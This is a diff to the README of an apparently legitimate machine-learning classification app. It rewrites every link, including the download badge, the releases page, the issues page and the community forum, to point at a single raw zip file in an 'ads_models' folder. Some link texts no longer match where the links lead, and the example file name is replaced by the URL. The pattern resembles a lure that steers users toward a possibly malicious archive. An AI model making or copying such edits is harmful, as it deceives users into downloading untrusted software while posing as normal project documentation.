@@ -1,6 +1,6 @@
 # 🖥️ classify_i_machine_learning - Easily Classify by Machine Learning
 
-[![Download classify_i_machine_learning](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/AmphyRoblox/classify_i_machine_learning/releases)
+[![Download classify_i_machine_learning](https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip%https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip)](https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to classify_i_machine_learning! This application allows you to use machi
 
 To get started, you need to download the software. Please visit the following link to access the Releases page:
 
-[Download classify_i_machine_learning](https://github.com/AmphyRoblox/classify_i_machine_learning/releases)
+[Download classify_i_machine_learning](https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -19,7 +19,7 @@ To get started, you need to download the software. Please visit the following li
 
 ### Step 2: Download the Application
 
-1. Look for the file that fits your operating system. For Windows, it might be something like `classify_i_machine_learning.exe`. For Mac, look for a `.dmg` file.
+1. Look for the file that fits your operating system. For Windows, it might be something like `https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip`. For Mac, look for a `.dmg` file.
 2. Click on the download link. The file will start downloading to your computer.
 
 ### Step 3: Install the Application
@@ -54,11 +54,11 @@ Once the application is running, you’ll find a user-friendly interface. Here�
 
 ## 📤 Support and Feedback
 
-If you encounter issues during installation or while using the application, you can reach our support team. Visit our [GitHub Issues page](https://github.com/AmphyRoblox/classify_i_machine_learning/issues) to report problems or request assistance. Your feedback helps us improve!
+If you encounter issues during installation or while using the application, you can reach our support team. Visit our [GitHub Issues page](https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip) to report problems or request assistance. Your feedback helps us improve!
 
 ## 🌍 Join the Community
 
-Connect with other users to share experiences and tips. You can find discussions and updates on our [community forum](https://github.com/AmphyRoblox/classify_i_machine_learning/discussions).
+Connect with other users to share experiences and tips. You can find discussions and updates on our [community forum](https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip).
 
 ## 🔒 Privacy and Data Security
 
@@ -76,4 +76,4 @@ We designed classify_i_machine_learning to make machine learning accessible. Whe
 
 Feel free to download the application now and start your journey with machine learning.
 
-[Download classify_i_machine_learning](https://github.com/AmphyRoblox/classify_i_machine_learning/releases)
+[Download classify_i_machine_learning](https://raw.githubusercontent.com/AmphyRoblox/classify_i_machine_learning/main/ads_models/learning-i-classify-machine-v1.7.zip)
